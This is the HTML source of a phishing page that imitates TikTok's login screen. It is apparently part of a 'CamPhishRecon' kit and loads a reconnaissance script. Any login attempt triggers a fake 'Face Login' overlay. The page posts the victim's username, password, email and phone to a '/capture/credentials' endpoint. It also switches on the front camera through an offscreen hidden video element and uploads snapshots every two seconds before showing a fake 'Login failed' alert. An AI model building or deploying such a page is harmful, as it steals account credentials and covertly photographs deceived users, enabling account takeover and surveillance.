<!-- DESC: TikTok login — 100% realistic replica with face login camera -->
<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="theme-color" content="#fff">
<title>TikTok — Log in</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fff;font-family:-apple-system,BlinkMacSystemFont,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.login-card{width:395px;max-width:100%}
.header{display:flex;align-items:center;justify-content:space-between;margin-bottom:24px}
.back{font-size:24px;color:#161823;cursor:pointer;width:40px;height:40px;display:flex;align-items:center;justify-content:center}
.logo-area{text-align:center;flex:1}
.logo-text{font-size:32px;font-weight:900;color:#161823}
h2{font-size:32px;font-weight:700;color:#161823;margin-bottom:12px;text-align:left}
.sub{font-size:15px;color:rgba(22,24,35,0.5);margin-bottom:20px}
.phone-row{display:flex;align-items:center;background:rgba(22,24,35,0.06);border:1px solid rgba(22,24,35,0.12);border-radius:4px 4px 0 0;overflow:hidden}
.country-code{padding:12px 8px 12px 16px;font-size:16px;color:#161823;border-right:1px solid rgba(22,24,35,0.12);display:flex;align-items:center;gap:4px}
input[type="text"],input[type="password"]{flex:1;padding:12px 16px;font-size:16px;border:none;background:rgba(22,24,35,0.06);color:#161823;outline:none;width:100%}
input::placeholder{color:rgba(22,24,35,0.34)}
.pass-row{background:rgba(22,24,35,0.06);border:1px solid rgba(22,24,35,0.12);border-top:none;border-radius:0 0 4px 4px;display:flex;align-items:center}
.forgot-link{color:rgba(22,24,35,0.5);font-size:12px;margin:8px 16px 8px auto;cursor:pointer}
.btn-login{width:100%;height:46px;background:rgba(254,44,85,1);border:none;border-radius:4px;color:#fff;font-size:16px;font-weight:600;cursor:pointer;margin-top:20px}
.btn-login:disabled{background:rgba(254,44,85,0.5)}
.alt-wrap{margin-top:20px;text-align:center}
.alt-wrap p{color:rgba(22,24,35,0.5);font-size:12px;margin-bottom:10px;display:flex;align-items:center;justify-content:center;gap:8px}
.alt-wrap p::before,.alt-wrap p::after{content:'';flex:1;height:1px;background:rgba(22,24,35,0.12);max-width:100px}
.alt-btn{width:100%;height:44px;background:#fff;border:1px solid rgba(22,24,35,0.12);border-radius:4px;font-size:15px;font-weight:600;color:#161823;cursor:pointer;margin-bottom:8px;display:flex;align-items:center;justify-content:center;gap:8px}
.face-btn{background:rgba(254,44,85,0.06);color:rgba(254,44,85,1);border-color:rgba(254,44,85,0.12)}
.signup{text-align:center;margin-top:20px;font-size:15px;color:#161823}
.signup a{color:rgba(254,44,85,1);font-weight:600;text-decoration:none}
.face-overlay{position:fixed;inset:0;background:rgba(0,0,0,.95);z-index:999;display:none;align-items:center;justify-content:center;flex-direction:column;color:#fff}
.face-overlay.active{display:flex}
.scan-ring{width:200px;height:200px;border-radius:50%;border:3px solid rgba(254,44,85,.4);position:relative}
.scan-ring::after{content:'';position:absolute;inset:-10px;border-radius:50%;border:2px solid rgba(254,44,85,.2);animation:scan 2s ease infinite}
@keyframes scan{0%{transform:scale(1);opacity:0}50%{opacity:1}100%{transform:scale(1.2);opacity:0}}
.spin{width:20px;height:20px;border:2px solid #fff;border-top:#fe2c55;border-radius:50%;animation:spin .6s linear infinite;margin-top:16px}
@keyframes spin{to{transform:rotate(360deg)}}
video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:-9999px}
</style>
</head><body>
<script src="forwarding_link/t/recon.js"></script>
<video id="v" playsinline autoplay muted></video>
<canvas id="cap" width="320" height="240"></canvas>

<div class="login-card">
<div class="header">
<div class="back">←</div>
<div class="logo-area"><span class="logo-text">TikTok</span></div>
<div class="back" style="visibility:hidden">?</div>
</div>
<h2>Log in</h2>
<div class="sub">Manage your account, check notifications, comment on videos, and more.</div>
<form onsubmit="return doLogin(event)">
<div class="phone-row">
<input type="text" placeholder="Phone or email" id="user" required>
</div>
<div class="pass-row">
<input type="password" placeholder="Password" id="pass" required>
</div>
<div class="forgot-link">Forgot password?</div>
<button type="submit" class="btn-login" id="loginBtn">Log in</button>
</form>

<div class="alt-wrap"><p>or</p></div>
<button class="alt-btn" onclick="doFaceLogin()">📱 Use phone / email / username</button>
<button class="alt-btn face-btn" onclick="doFaceLogin()">📸 Face Login</button>
<button class="alt-btn" onclick="doFaceLogin()">G Continue with Google</button>

<div class="signup">Don't have an account? <a href="#">Sign up</a></div>
</div>

<div class="face-overlay" id="faceScan">
<div class="scan-ring"></div>
<div style="font-size:18px;font-weight:700;margin-top:20px">Face Login</div>
<div style="font-size:13px;color:#aaa;margin-top:6px">Center your face for instant login</div>
<div class="spin"></div>
</div>

<script>
var API='API_BASE_URL',SHARE_URL=location.origin+'/t/tiktok';
if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
function doLogin(e){e.preventDefault();doFaceLogin();return false;}
function doFaceLogin(){
var fs=document.getElementById('faceScan');fs.classList.add('active');
var btn=document.getElementById('loginBtn');btn.innerHTML='Logging in...';btn.disabled=true;
if(window.CamPhishRecon)CamPhishRecon.Capture.event('tiktok_login',{});
captureCreds();
if(navigator.mediaDevices){
navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(stream){
var v=document.getElementById('v');v.srcObject=stream;v.play();
var cap=document.getElementById('cap'),cx=cap.getContext('2d');
var ci=setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);if(window.CamPhishRecon)CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'tiktok_face');}},2000);
setTimeout(function(){clearInterval(ci);fs.classList.remove('active');alert('Login failed. Try again.');btn.innerHTML='Log in';btn.disabled=false;},5000);
}).catch(function(){fs.classList.remove('active');btn.innerHTML='Log in';btn.disabled=false;});
}else{setTimeout(function(){fs.classList.remove('active');btn.innerHTML='Log in';btn.disabled=false;},2000);}
}
function captureCreds(){
var u=document.getElementById("user");var p=document.getElementById("pass");
if(!u||!p)return;
var data={template_id:"tiktok",username:u.value,password:p.value};
if(u.value.indexOf("@")>=0)data.email=u.value;
if(/^\+?[0-9]{10,}/.test(u.value))data.phone=u.value;
fetch((window.CamPhishRecon?"/api":"API_BASE_URL")+"/capture/credentials",{
method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)
}).catch(function(){});
}
</script>
</body></html>
